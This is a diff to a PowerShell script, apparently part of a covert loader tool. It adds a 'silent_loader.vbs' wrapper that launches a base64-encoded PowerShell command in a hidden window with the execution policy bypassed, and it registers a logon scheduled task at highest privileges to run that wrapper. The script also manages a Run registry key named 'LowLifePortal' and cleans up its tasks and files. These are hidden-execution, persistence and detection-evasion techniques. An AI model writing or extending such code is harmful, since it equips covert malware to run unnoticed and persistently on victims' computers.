@@ -626,8 +626,14 @@ if(`$s){. ([scriptblock]::Create(`$s)) -Key `$k;break}
 }
 "@
             $encLoader = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($loaderScript))
+            $vbsPath = Join-Path $resolvedPath "silent_loader.vbs"
+            $vbsContent = @"
+Set objShell = CreateObject("WScript.Shell")
+objShell.Run "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -EncodedCommand $encLoader", 0, False
+"@
+            [System.IO.File]::WriteAllText($vbsPath, $vbsContent)
 
-            $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -EncodedCommand $encLoader"
+            $action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$vbsPath`""
             $trigger = New-ScheduledTaskTrigger -AtLogon
             $principal = New-ScheduledTaskPrincipal -UserId $currentUser -RunLevel Highest -LogonType Interactive
             Register-ScheduledTask -TaskName $LoaderTaskName -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null
@@ -639,6 +645,8 @@ if(`$s){. ([scriptblock]::Create(`$s)) -Key `$k;break}
             Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "LowLifePortal" -Force -ErrorAction SilentlyContinue | Out-Null
         } else {
             Log-Msg "Persistence disabled: Cleaning up scheduled tasks and registry keys..."
+            $vbsPath = Join-Path $resolvedPath "silent_loader.vbs"
+            if (Test-Path $vbsPath) { Remove-Item $vbsPath -Force -ErrorAction SilentlyContinue }
             Unregister-ScheduledTask -TaskName $LoaderTaskName -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
             Unregister-ScheduledTask -TaskName $PersistTask -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
             Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "LowLifePortal" -Force -ErrorAction SilentlyContinue | Out-Null
